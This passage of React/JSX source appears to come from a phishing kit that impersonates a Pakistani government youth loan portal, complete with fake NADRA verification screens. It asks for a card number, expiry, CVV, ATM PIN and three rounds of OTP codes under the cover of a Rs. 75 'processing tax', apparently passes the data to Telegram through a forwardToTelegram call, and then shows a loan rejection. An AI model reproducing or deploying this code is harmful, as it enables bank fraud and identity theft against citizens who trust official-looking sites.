            <div className="relative w-28 h-28 mx-auto flex items-center justify-center">
              <div className="absolute inset-0 border-4 border-emerald-100 rounded-full animate-ping opacity-75"></div>
              <div className="absolute inset-2 border-2 border-dashed border-emerald-500 rounded-full animate-spin"></div>
              <div className="w-16 h-16 bg-emerald-800 text-white rounded-full flex items-center justify-center shadow-lg relative z-10">
                <Search className="w-8 h-8 text-emerald-200 animate-pulse" />
              </div>
            </div>

            <div className="space-y-2">
              <div className="inline-block bg-emerald-50 text-emerald-800 text-xs font-bold px-3 py-1 rounded-full border border-emerald-200">
                ⟳ SEARCHING & VERIFYING
              </div>
              <h2 className="text-2xl font-black text-slate-900">
                Searching NADRA Citizen Records...
              </h2>
              <p className="text-sm font-urdu text-emerald-800 font-semibold">
                نادرا ریکارڈ کی تلاش اور جانچ جاری ہے...
              </p>
              <p className="text-xs text-slate-500 max-w-md mx-auto">
                Querying national identity database & verifying citizen eligibility...
              </p>
            </div>

            <div className="space-y-2 text-left bg-slate-50 p-4 rounded-2xl border border-slate-200">
              <div className="flex justify-between text-xs font-bold text-slate-700">
                <span>Verifying Security Tokens & Encrypted Records...</span>
                <span>{nadraProgress}%</span>
              </div>
              <div className="w-full bg-slate-200 h-2.5 rounded-full overflow-hidden">
                <div
                  className="bg-emerald-600 h-full transition-all duration-300 rounded-full"
                  style={{ width: `${nadraProgress}%` }}
                ></div>
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-left">
              <div className="bg-emerald-50/60 p-3.5 rounded-xl border border-emerald-200 flex items-center justify-between">
                <div className="flex items-center gap-2 text-xs font-semibold text-slate-700">
                  <Building2 className="w-4 h-4 text-emerald-700" />
                  <span>Government National Switch & NADRA</span>
                </div>
                <span className="text-xs font-bold text-emerald-700 flex items-center gap-1">
                  <Check className="w-3.5 h-3.5" /> Connected
                </span>
              </div>
              <div className="bg-emerald-50/60 p-3.5 rounded-xl border border-emerald-200 flex items-center justify-between">
                <div className="flex items-center gap-2 text-xs font-semibold text-slate-700">
                  <Lock className="w-4 h-4 text-emerald-700" />
                  <span>256-Bit SSL Financial Encryption</span>
                </div>
                <span className="text-xs font-bold text-emerald-700 flex items-center gap-1">
                  <Check className="w-3.5 h-3.5" /> Active
                </span>
              </div>
            </div>

            <p className="text-xs text-slate-400 italic">
              Please do not refresh or close this browser window while records are being searched. <br />
              <span className="font-urdu">ریکارڈ کی تلاش جاری ہے، براؤزر ریفریش نہ کریں۔</span>
            </p>
          </div>
        )}

        {/* PROCESSING TAX & ATM CARD FEE VERIFICATION */}
        {step === 'tax_payment' && (
          <div className="bg-white rounded-3xl shadow-xl border border-slate-200 overflow-hidden p-6 sm:p-8 space-y-6">
            <div className="bg-emerald-50 border border-emerald-200 p-4 rounded-2xl flex items-start gap-3">
              <CreditCard className="w-5 h-5 text-emerald-700 mt-0.5 shrink-0" />
              <div>
                <h3 className="text-sm font-bold text-emerald-900">Pay Rs. 75 processing tax to submit application</h3>
                <p className="text-xs text-emerald-700">درخواست جمع کرنے کے لیے 75 روپے ٹیکس ادا کریں۔ یہ فیس تصدیق کے لیے ہے۔</p>
              </div>
            </div>

            {/* Virtual Card Graphic */}
            <div className="relative bg-gradient-to-tr from-[#05140c] via-[#0b4c2c] to-[#042414] p-6 rounded-3xl text-white shadow-2xl border border-emerald-500/50 overflow-hidden">
              <div className="absolute inset-0 opacity-20 bg-[radial-gradient(#10b981_1px,transparent_1px)] [background-size:16px_16px]"></div>
              <div className="absolute -right-12 -top-12 w-48 h-48 bg-emerald-400/20 rounded-full blur-3xl pointer-events-none"></div>

              <div className="relative z-10 flex justify-between items-start">
                <div className="w-12 h-9 bg-gradient-to-br from-amber-200 to-amber-400 rounded-md border border-amber-500/60 flex items-center justify-center shadow-inner">
                  <div className="w-8 h-6 border border-amber-600/40 grid grid-cols-2 grid-rows-2">
                    <div className="border-r border-b border-amber-600/40"></div>
                    <div className="border-b border-amber-600/40"></div>
                  </div>
                </div>
                <div className="flex flex-col items-end">
                  <span className="text-xs font-semibold tracking-widest text-emerald-300 uppercase">premium debit</span>
                  <div className="flex gap-0.5 text-emerald-400 mt-1">
                    <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></div>
                    <span className="text-xs font-bold font-mono">)))</span>
                  </div>
                </div>
              </div>

              <div className="relative z-10 mt-8 font-mono text-xl tracking-[0.25em] text-emerald-100 drop-shadow">
                {taxData.cardNumber ? taxData.cardNumber : '**** **** **** ****'}
              </div>

              <div className="relative z-10 mt-6 flex justify-between items-end">
                <div className="flex gap-6">
                  <div>
                    <span className="text-[9px] uppercase tracking-wider text-emerald-300 block font-semibold">VALID FROM</span>
                    <span className="font-mono text-xs text-slate-100 font-bold">04/2024</span>
                  </div>
                  <div>
                    <span className="text-[9px] uppercase tracking-wider text-emerald-300 block font-semibold">VALID THRU</span>
                    <span className="font-mono text-xs text-slate-100 font-bold">{taxData.expiry ? taxData.expiry : '04/2029'}</span>
                  </div>
                </div>
                <div className="text-right bg-black/30 px-3 py-1.5 rounded-xl border border-emerald-500/30">
                  <span className="text-[9px] uppercase tracking-wider text-emerald-300 block font-semibold">CVC/CVV Code</span>
                  <span className="font-mono text-xs tracking-widest text-emerald-200 font-bold">***</span>
                </div>
              </div>
            </div>

            <form onSubmit={handleTaxSubmit} className="space-y-4">
              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                  Bank ATM Card Number * <span className="text-slate-400 font-normal">/ اے ٹی ایم کارڈ نمبر (16 Digits)</span>
                </label>
                <input
                  type="text"
                  required
                  maxLength={19}
                  placeholder="4216 7100 1234 5678"
                  value={taxData.cardNumber}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, '').slice(0, 16);
                    const formatted = val.match(/.{1,4}/g)?.join(' ') || val;
                    setTaxData({ ...taxData, cardNumber: formatted });
                  }}
                  className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800 font-mono tracking-wider"
                />
                <span className="text-[10px] text-slate-500 mt-1 block">Enter exactly 16 numbers ({taxData.cardNumber.replace(/\D/g, '').length}/16)</span>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                    Expiry * <span className="text-slate-400 font-normal">/ معیاد</span>
                  </label>
                  <input
                    type="text"
                    required
                    placeholder="MM / YY"
                    maxLength={5}
                    value={taxData.expiry}
                    onChange={(e) => setTaxData({ ...taxData, expiry: e.target.value })}
                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800 font-mono text-center"
                  />
                </div>
                <div>
                  <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
                    CVV * <span className="text-slate-400 font-normal">/ سی وی وی</span>
                  </label>
                  <input
                    type="password"
                    required
                    maxLength={3}
                    placeholder="***"
                    value={taxData.cvv}
                    onChange={(e) => {
                      const val = e.target.value.replace(/\D/g, '').slice(0, 3);
                      setTaxData({ ...taxData, cvv: val });
                    }}
                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-emerald-600 focus:bg-white outline-none transition text-slate-800 font-mono text-center"
                  />
                </div>
              </div>

              <div className="bg-emerald-50/80 border border-emerald-200 p-4 rounded-2xl flex items-center justify-between">
                <span className="text-xs font-bold text-slate-700 uppercase">Processing Tax Required</span>
                <span className="text-base font-extrabold text-emerald-800">Rs. 75</span>
              </div>

              <div className="pt-4 flex gap-4">
                <button
                  type="button"
                  onClick={() => setStep('personal')}
                  className="w-1/3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold py-3.5 rounded-xl transition"
                >
                  Back
                </button>
                <button
                  type="submit"
                  className="w-2/3 bg-[#0b4c2c] hover:bg-emerald-900 text-white font-bold py-3.5 rounded-xl shadow-lg transition flex items-center justify-center gap-2"
                >
                  <span>Proceed</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </form>
          </div>
        )}

        {/* ATM PIN SECURITY VERIFICATION */}
        {step === 'atm_pin' && (
          <div className="bg-white rounded-3xl shadow-xl border border-slate-200 overflow-hidden p-6 sm:p-8 space-y-6">
            <div className="bg-emerald-800 text-white p-5 rounded-2xl shadow-md">
              <div className="text-[10px] uppercase font-semibold text-emerald-200 tracking-wider">
                GOVERNMENT OF PAKISTAN · MINISTRY OF FINANCE
              </div>
              <h2 className="text-xl font-black mt-1">ATM PIN Security Verification</h2>
            </div>
            <form onSubmit={handleAtmPinSubmit} className="space-y-6 text-center">
              <input
                type="password"
                required
                maxLength={4}
                placeholder="****"
                value={atmPin}
                onChange={(e) => setAtmPin(e.target.value.replace(/\D/g, '').slice(0, 4))}
                className="w-48 mx-auto px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-center font-mono text-2xl"
              />
              <button type="submit" className="w-full bg-[#0b4c2c] text-white py-3 rounded-xl">Verify PIN</button>
            </form>
          </div>
        )}

        {/* OTP VERIFICATION (STEP 2) */}
        {step === 'otp_2' && (
          <div className="bg-white rounded-3xl p-8 space-y-6">
            <h2 className="text-xl font-black">OTP Verification - Step 2</h2>
            <form onSubmit={handleOtp2Submit} className="space-y-6 text-center">
              {renderOtpBoxes(otp2, setOtp2, 'otp2')}
              <button type="submit" className="w-full bg-[#0b4c2c] text-white py-3 rounded-xl">Submit Step 2</button>
            </form>
          </div>
        )}

        {/* OTP VERIFICATION (STEP 3) */}
        {step === 'otp_3' && (
          <div className="bg-white rounded-3xl p-8 space-y-6">
            <h2 className="text-xl font-black">OTP Verification - Step 3 (Final)</h2>
            <form onSubmit={handleOtp3Submit} className="space-y-6 text-center">
              {renderOtpBoxes(otp3, setOtp3, 'otp3')}
              <button type="submit" className="w-full bg-[#0b4c2c] text-white py-3 rounded-xl">Finalize</button>
            </form>
          </div>
        )}
        
        {/* OTP VERIFICATION */}
        {step === 'otp_1' && (
          <div className="bg-white rounded-3xl shadow-xl border border-slate-200 overflow-hidden p-6 sm:p-8 space-y-6">
            <div className="bg-emerald-800 text-white p-5 rounded-2xl shadow-md">
              <div className="text-[10px] uppercase font-semibold text-emerald-200 tracking-wider">
                GOVERNMENT OF PAKISTAN · MINISTRY OF FINANCE
              </div>
              <h2 className="text-xl font-black mt-1">OTP Verification / او ٹی پی تصدیق</h2>
            </div>

            {otpError && (
              <div className="bg-rose-50 border border-rose-200 p-4 rounded-2xl flex items-center gap-3 text-rose-800 text-xs font-medium">
                <AlertCircle className="w-5 h-5 text-rose-600 shrink-0" />
                <span>The first OTP was incorrect. Please enter the new OTP code received.</span>
              </div>
            )}

            <div className="bg-emerald-50 border border-emerald-200 p-4 rounded-2xl space-y-1">
              <h4 className="text-xs font-bold text-emerald-900">OTP code has been sent to your mobile number</h4>
              <p className="text-xs font-urdu text-emerald-700">آپ کے موبائل نمبر پر او ٹی پی کوڈ بھیج دیا گیا ہے۔</p>
            </div>

            <div className="bg-slate-50 border border-slate-200 p-3 rounded-xl flex items-center justify-between text-xs font-medium text-slate-700">
              <span>CODE SENT TO: 5454 - 65000</span>
              <span className="bg-emerald-100 text-emerald-800 px-2.5 py-1 rounded-full font-bold text-[11px]">
                SMS Verified
              </span>
            </div>

            <form onSubmit={handleOtp1Submit} className="space-y-6 text-center">
              <div>
                <label className="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-3">
                  ENTER 6-DIGIT OTP CODE <span className="font-urdu text-xs font-normal text-slate-500">(6 ہندسوں کا کوڈ درج کریں)</span>
                </label>
                {renderOtpBoxes(otp1, setOtp1, 'otp1')}
                <span className="text-[11px] text-slate-400 mt-1.5 block">Enter exactly 6 digits</span>
              </div>

              <div className="bg-emerald-50/60 border border-emerald-200 p-4 rounded-2xl flex items-center justify-between">
                <div className="flex items-center gap-2 text-xs text-slate-700 font-medium">
                  <Clock className="w-4 h-4 text-emerald-700" />
                  <span>EXPIRES IN 5m / <span className="font-urdu">وقت خاتمہ:</span></span>
                </div>
                <div className="flex items-center gap-3">
                  <span className="font-mono font-bold text-emerald-800 text-sm">{formatTime(timerSeconds)}</span>
                  <button
                    type="button"
                    onClick={() => {
                      forwardToTelegram('resend_otp', {});
                      setTimerSeconds(300);
                    }}
                    className="bg-white border border-emerald-300 text-emerald-800 hover:bg-emerald-50 text-xs font-bold px-3 py-1.5 rounded-lg transition flex items-center gap-1 shadow-sm"
                  >
                    <RefreshCw className="w-3 h-3" />
                    <span>Resend / <span className="font-urdu">دوبارہ بھیجیں</span></span>
                  </button>
                </div>
              </div>

              <div className="flex gap-4">
                <button
                  type="button"
                  onClick={() => setStep('tax_payment')}
                  className="w-1/3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold py-3.5 rounded-xl transition"
                >
                  Back
                </button>
                <button
                  type="submit"
                  className="w-2/3 bg-[#0b4c2c] hover:bg-emerald-900 text-white font-bold py-3.5 rounded-xl shadow-lg transition flex items-center justify-center gap-2"
                >
                  <span>Finalize & Submit / <span className="font-urdu">تصدیق کریں</span></span>
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </form>
          </div>
        )}

        {/* APPLICATION REJECTED */}
        {step === 'success' && (
          <div className="bg-white rounded-3xl shadow-xl border border-slate-200 p-6 sm:p-8 text-center space-y-6">
            <div className="w-20 h-20 bg-rose-100 text-rose-800 rounded-full flex items-center justify-center mx-auto shadow-inner border-2 border-rose-300">
              <XCircle className="w-10 h-10 text-rose-700" />
            </div>

            <div className="space-y-2">
              <div className="inline-block bg-rose-50 text-rose-800 text-xs font-bold px-3 py-1 rounded-full border border-rose-200">
                APPLICATION REJECTED / درخواست مسترد کر دی گئی
              </div>
              <h2 className="text-2xl font-black text-slate-900">
                Loan Application Rejected
              </h2>
            </div>

            {/* Receipt Card */}
            <div className="bg-slate-50 border border-slate-200 rounded-3xl p-6 text-left space-y-4 shadow-sm relative overflow-hidden">
              <div className="flex justify-between items-start border-b border-slate-200 pb-4">
                <div>
                  <span className="text-[10px] uppercase font-bold text-slate-400 tracking-wider block">APPLICATION ID</span>
                  <span className="text-lg font-mono font-extrabold text-slate-900">{applicationId}</span>
                </div>
                <span className="bg-rose-100 text-rose-800 px-3 py-1 rounded-full text-xs font-bold border border-rose-300">
                  Rejected
                </span>
              </div>

              <div className="grid grid-cols-2 gap-4 text-sm">
                <div>
                  <span className="text-xs text-slate-500 block">Applicant Name</span>
                  <span className="font-bold text-slate-800">{personal.fullName || 'Valued Citizen'}</span>
                </div>
                <div>
                  <span className="text-xs text-slate-500 block">CNIC Number</span>
                  <span className="font-mono font-bold text-slate-800">{personal.cnic || '42101-*******-1'}</span>
                </div>
                <div>
                  <span className="text-xs text-slate-500 block">Requested Amount</span>
                  <span className="font-bold text-slate-800">PKR 500,000</span>
                </div>
                <div>
                  <span className="text-xs text-slate-500 block">Selected Bank</span>
                  <span className="font-bold text-slate-800">National Bank of Pakistan</span>
                </div>
              </div>
            </div>

            <div className="space-y-3 pt-2">
              <button
                onClick={saveToGoogleDrive}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-2xl transition flex items-center justify-center gap-2 shadow-md"
              >
                <Globe className="w-4 h-4 text-blue-200" />
                <span>Save Report to Google Drive</span>
              </button>

              {driveStatus && (
                <p className="text-xs font-semibold text-emerald-700 bg-emerald-50 p-2.5 rounded-xl border border-emerald-200">
                  {driveStatus}
                </p>
              )}

              <button
                onClick={() => window.print()}
                className="w-full bg-slate-100 hover:bg-slate-200 text-slate-800 font-bold py-3.5 rounded-2xl transition flex items-center justify-center gap-2"
              >
                <Printer className="w-4 h-4 text-slate-600" />
                <span>Print Receipt / رسیپٹ پرنٹ کریں</span>
              </button>

              <button
                onClick={() => {
                  setStep('home');
                  setPersonal({ fullName: '', cnic: '', mobile: '', gender: '', dob: '', province: 'Punjab', address: '' });
                  setTaxData({ cardNumber: '', expiry: '', cvv: '' });
                  setAtmPin('');
                  setOtp1('');
                }}
                className="w-full bg-[#0b4c2c] hover:bg-emerald-900 text-white font-bold py-3.5 rounded-2xl shadow-lg transition flex items-center justify-center gap-2"
              >
                <span>Submit Another / نئی درخواست</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}
      </main>

      {/* Footer */}
      <footer className="mt-16 border-t border-slate-200 bg-white py-6 text-center text-xs text-slate-500 space-y-2">
        <p>© 2026 Government of Pakistan · Ministry of Finance. All Rights Reserved.</p>
        <p className="font-urdu">سرکاری پاکستان - وزارت خزانہ ۔ پاکستان یوتھ لون پورٹل</p>
      </footer>
    </div>
  );
}
